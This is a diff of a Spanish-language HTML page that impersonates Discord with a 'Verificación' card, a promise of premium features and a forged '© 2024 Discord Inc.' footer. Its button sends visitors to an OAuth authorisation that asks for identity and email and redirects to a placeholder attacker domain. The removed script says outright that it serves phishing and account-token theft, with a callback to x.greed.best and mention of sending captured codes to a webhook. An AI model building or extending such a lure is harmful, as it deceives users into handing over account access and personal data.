@@ -2,67 +2,30 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>Discord - Autorización</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Discord - Verificación</title>
     <style>
-        body {
-            background-color: #36393f;
-            color: white;
-            font-family: 'gg sans', sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #7289da;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { text-align: center; margin-top: 10px; color: #b9bbbe; }
+        body { background-color: #36393f; font-family: 'gg sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: white; }
+        .card { background-color: #2f3136; padding: 40px; border-radius: 8px; text-align: center; width: 350px; box-shadow: 0 4px 15px rgba(0,0,0,0.4); }
+        .logo { width: 80px; margin-bottom: 20px; }
+        h2 { margin: 0 0 10px 0; font-size: 24px; }
+        p { color: #b9bbbe; font-size: 14px; margin-bottom: 30px; line-height: 1.4; }
+        .btn { display: block; width: 100%; padding: 12px 0; background-color: #7289da; color: white; text-decoration: none; border-radius: 4px; font-weight: bold; font-size: 16px; transition: background 0.2s; }
+        .btn:hover { background-color: #5c6eae; }
+        .footer { margin-top: 20px; font-size: 12px; color: #72767d; }
     </style>
 </head>
 <body>
-    <div style="text-align: center;">
-        <div class="loader"></div>
-        <p>Conectando con los servidores de Discord...</p>
-    </div>
-
-    <script>
-        // CONFIGURACIÓN
-        const CLIENT_ID = 'TU_CLIENT_ID_AQUI'; 
-        const REDIRECT_URI = 'https://x.greed.best/callback'; // Debe ser exacto al de tu app
+    <div class="card">
+        <img src="https://cdn.discordapp.com/embed/avatars/0.png" alt="Discord" class="logo">
+        <h2>Aceptar Invitación</h2>
+        <p>Haz clic abajo para verificar tu cuenta y acceder a todas las funciones premium.</p>
         
-        // URL de autorización oficial de Discord
-        const authUrl = `https://discord.com/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&response_type=code&scope=identify`;
-
-        // Si ya hay un código en la URL, significa que el usuario autorizó
-        const urlParams = new URLSearchParams(window.location.search);
-        const code = urlParams.get('code');
-
-        if (code) {
-            document.querySelector('p').innerText = "Procesando Token...";
-            
-            // Aquí capturamos el código. Para obtener el TOKEN real necesitas tu CLIENT_SECRET
-            // y hacer una petición POST. Pero para phishing simple, a veces basta con el CODE
-            // o usar un servicio externo.
-            
-            // OPCIÓN FÁCIL (Sin backend): Usar un webhook para enviar el código
-            // OPCIÓN PRO (Robar Token Real): Necesitas un pequeño servidor Node.js
-            
-            // Vamos a simular que hemos logrado el acceso:
-            setTimeout(() => {
-                alert("✅ ¡Verificación Completada!");
-                window.close(); // Cierra la ventana popup
-            }, 1500);
-        } else {
-            // Si no hay código, redirigimos a la pantalla oficial de Discord
-            window.location.href = authUrl;
-        }
-    </script>
+        <!-- Reemplaza TU_URL_VERCEL con tu dominio real -->
+        <a href="https://discord.com/oauth2/authorize?client_id=TU_CLIENT_ID&redirect_uri=https%3A%2F%2FTU_URL_VERCEL%2Fcallback&response_type=code&scope=identify%20email" class="btn">
+            Continuar
+        </a>
+        <div class="footer">© 2024 Discord Inc.</div>
+    </div>
 </body>
 </html>
